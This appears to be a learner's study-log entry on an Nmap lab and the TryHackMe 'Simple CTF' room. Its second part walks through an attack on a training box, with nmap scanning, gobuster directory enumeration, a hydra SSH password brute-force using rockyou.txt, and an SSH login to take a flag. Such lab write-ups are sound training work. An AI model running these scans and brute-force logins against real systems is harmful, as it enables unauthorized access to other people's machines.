# Day 12 – Nmap Lab (CrackTheLab) & Simple CTF (TryHackMe)

## 🧪 Practical Focus: Nmap Exploration and CTF-based Exploitation

On Day 12, I completed two important labs:

1. **Nmap Lab on CrackTheLab** – Strengthened my command-line proficiency and manual page navigation for Nmap.
2. **Simple CTF Room on TryHackMe** – Reinforced scanning, enumeration, and brute-force access techniques.

---

## 🔍 Part 1: Nmap Lab (CrackTheLab)

### 🎯 Objective:
To understand and master the core functionalities and flags of the `nmap` tool without relying on online resources.

### 🔧 Methodology:
- Used `nmap --help` and `man nmap` to explore options, flags, and scanning techniques.
- Completed all tasks by referencing **only local help documentation**.

### 📌 Key Takeaways:
- Learned about different types of scans:
  - SYN Scan (`-sS`)
  - Service Version Detection (`-sV`)
  - OS Detection (`-O`)
  - Script Scanning (`-sC`)
- Understood how to perform:
  - TCP and UDP scanning
  - Scan timing and performance tuning (`-T1` to `-T5`)
  - Output formatting (`-oN`, `-oX`, `-oG`, `-oA`)
- Emphasized *self-reliance* and *documentation reading* as critical skills for penetration testers.

---

## 🔓 Part 2: TryHackMe – "Simple CTF"

### 🛠️ Tools Used:
- `nmap` for scanning
- `gobuster` for directory enumeration
- `hydra` for brute-force attack
- `ssh` for remote access

### 📌 Attack Strategy:

#### 🔍 1. Nmap Scan
Executed an aggressive scan to identify live services:

```bash
nmap -sC -sV -oN simplectf.txt <target-IP>
```
### 🕸️ 2. Directory Brute-Forcing with Gobuster

```bash
gobuster dir -u http://<target-IP> -w /usr/share/wordlists/dirb/common.txt
```
> Found a subdirectory revealing a username.

### 🔐 3. SSH Password Brute-Force using Hydra

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-IP>:2222
```
> Successfully obtained valid SSH credentials.

### 📥 4. SSH Access and Flag Capture

```bash
ssh <username>@<target-IP> -p 2222
cat user.txt
```
> ✅ User.txt flag retrieved successfully.

---

## 📝 Summary

Day 12 focused on enhancing my manual tool usage and applying prior theoretical knowledge in a structured attack environment. I completed an Nmap lab without external references, strengthening my command-line research capabilities. The "Simple CTF" room on TryHackMe reinforced concepts of service enumeration, brute-force, and SSH exploitation. These practicals demonstrate growing confidence in real-world engagement techniques.
